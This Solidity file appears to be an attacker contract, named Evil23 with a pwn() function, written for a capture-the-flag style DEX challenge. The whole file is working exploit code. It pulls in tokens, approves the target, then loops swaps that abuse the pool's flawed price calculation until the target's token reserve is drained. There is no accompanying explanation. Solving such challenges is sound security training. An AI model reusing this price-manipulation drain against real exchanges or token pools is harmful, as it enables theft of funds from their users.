// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

///@dev I used low-level call coz of openzeppelin libary version collision
contract Evil23 {
    address tokenA;
    address tokenB;
    address target;

    constructor(address _tokenA, address _tokenB, address _target) {
        tokenA = _tokenA;
        tokenB = _tokenB;
        target = _target;
    }

    function pwn() external {
        tokenA.call(
            abi.encodeWithSignature(
                "transferFrom(address,address,uint256)",
                msg.sender,
                address(this),
                10
            )
        );
        tokenB.call(
            abi.encodeWithSignature(
                "transferFrom(address,address,uint256)",
                msg.sender,
                address(this),
                10
            )
        );

        tokenA.call(
            abi.encodeWithSignature(
                "approve(address,uint256)",
                target,
                type(uint256).max
            )
        );
        tokenB.call(
            abi.encodeWithSignature(
                "approve(address,uint256)",
                target,
                type(uint256).max
            )
        );

        // create the initial price disruption
        target.call(
            abi.encodeWithSignature(
                "swap(address,address,uint256)",
                tokenA,
                tokenB,
                5
            )
        );

        for (uint256 i = 10; i < 100; i++) {
            (, bytes memory amount) = tokenA.staticcall(
                abi.encodeWithSignature("balanceOf(address)", address(this))
            );
            uint256 balanceThis = abi.decode(amount, (uint256));
            if (balanceThis == 110) {
                break;
            }

            (, bytes memory amountTargetA) = tokenA.staticcall(
                abi.encodeWithSignature("balanceOf(address)", target)
            );
            uint256 balanceTargetA = abi.decode(amountTargetA, (uint256));

            (, bytes memory amountTargetB) = tokenB.staticcall(
                abi.encodeWithSignature("balanceOf(address)", target)
            );
            uint256 balanceTargetB = abi.decode(amountTargetB, (uint256));

            if (balanceTargetA < i) {
                i = i - balanceTargetA;
            } else if (balanceTargetB < i) {
                i = i - balanceTargetB;
            }

            (, bytes memory swapPrice) = target.staticcall(
                abi.encodeWithSignature(
                    "getSwapPrice(address,address,uint256)",
                    tokenB,
                    tokenA,
                    i
                )
            );
            uint256 price = abi.decode(swapPrice, (uint256));

            if (price > i) {
                target.call(
                    abi.encodeWithSignature(
                        "swap(address,address,uint256)",
                        tokenB,
                        tokenA,
                        i
                    )
                );
            } else {
                target.call(
                    abi.encodeWithSignature(
                        "swap(address,address,uint256)",
                        tokenA,
                        tokenB,
                        i
                    )
                );
            }
        }
    }
}
